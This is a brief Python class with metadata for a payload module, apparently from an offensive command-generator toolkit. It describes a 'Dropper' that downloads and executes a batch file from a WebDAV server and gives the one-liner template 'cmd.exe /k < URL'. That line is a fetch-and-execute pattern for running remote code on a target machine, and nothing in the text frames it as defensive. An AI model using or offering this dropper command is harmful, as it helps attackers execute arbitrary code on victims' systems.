class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Download and execute a batch file from a webdav server."
    function    = "Dropper"
    liner       = "cmd.exe /k < URL"
